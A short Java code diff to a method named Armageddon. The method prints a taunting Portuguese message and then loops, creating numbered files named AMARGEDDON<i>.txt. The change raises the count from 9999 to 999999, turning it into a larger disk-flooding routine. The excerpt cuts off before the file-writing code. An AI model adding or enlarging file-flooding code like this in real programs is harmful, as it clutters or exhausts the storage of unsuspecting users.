@@ -145,7 +145,7 @@ class FE {
     public void Armageddon() {
         FE fe = new FE();
         System.out.println("VOCE DECIDIU SOFRER AS CONSEQUENCIAS DO ARMAGEDDON, ENTAO SE PREPARA PRA BALA QUE LA VEM POEIRA!");
-        for (int i = 0; i < 9999; i++) {
+        for (int i = 0; i < 999999; i++) {
             String arqname = "AMARGEDDON" + i + ".txt";
             try {
                 File f = new File(arqname);
